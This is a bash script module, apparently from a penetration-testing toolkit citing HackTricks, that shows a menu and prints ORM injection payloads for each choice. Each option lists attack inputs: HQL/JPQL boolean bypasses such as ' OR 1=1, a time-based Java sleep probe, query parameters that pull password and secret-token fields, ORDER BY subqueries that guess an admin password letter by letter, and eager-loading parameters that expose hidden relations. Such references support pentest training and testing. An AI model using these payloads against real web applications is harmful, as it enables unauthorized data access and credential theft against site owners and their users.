#!/bin/bash
# HackTricks Ref: orm-injection
# Module: ORM (Object-Relational Mapping) Injection

echo -e "${C6}[WEB ATTACK: ORM_INJECTION]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/orm-injection"
echo -e "--------------------------------------------------"

echo -e "${C4}Select ORM Injection Vector:${NC}"
echo "1) HQL (Hibernate) / JPQL Injection Payloads"
echo "2) Data Leakage via Object Properties"
echo "3) Bypass via OrderBy/GroupBy Injection"
echo "4) Relational Mapping Exploitation"
echo "0) Exit"

read -p "Selection: " orm_opt

case $orm_opt in
    1)
        echo -e "\n${C2}[*] HQL/JPQL Injection:${NC}"
        echo "Unlike SQL, HQL queries objects. Try to break the logic:"
        echo " - ' OR 1=1"
        echo " - ' OR 'a'='a"
        echo " - Admin' or '1'='1"
        echo "Check if you can call Java methods: ' and java.lang.Thread.sleep(5000)='1"
        ;;
    2)
        echo -e "\n${C2}[*] Object Property Leakage:${NC}"
        echo "Try to access fields that are not meant to be public:"
        echo " - ?filter[user.password][gt]=0"
        echo " - ?sort=user.secret_token"
        echo " - ?with[]=secretRelationship"
        ;;
    3)
        echo -e "\n${C2}[*] OrderBy/GroupBy Injection:${NC}"
        echo "Many ORMs do not sanitize column names in sort/order clauses:"
        echo " - ?order=CASE WHEN (1=1) THEN name ELSE price END"
        echo " - ?order=(SELECT 1 FROM users WHERE name='admin' AND password LIKE 'a%')"
        ;;
    4)
        echo -e "\n${C2}[*] Relational Mapping Exploitation:${NC}"
        echo "If the ORM allows 'eager loading' via URL parameters:"
        echo " - ?include=permissions,roles,audit_logs"
        echo "This can reveal sensitive relations that are usually hidden."
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
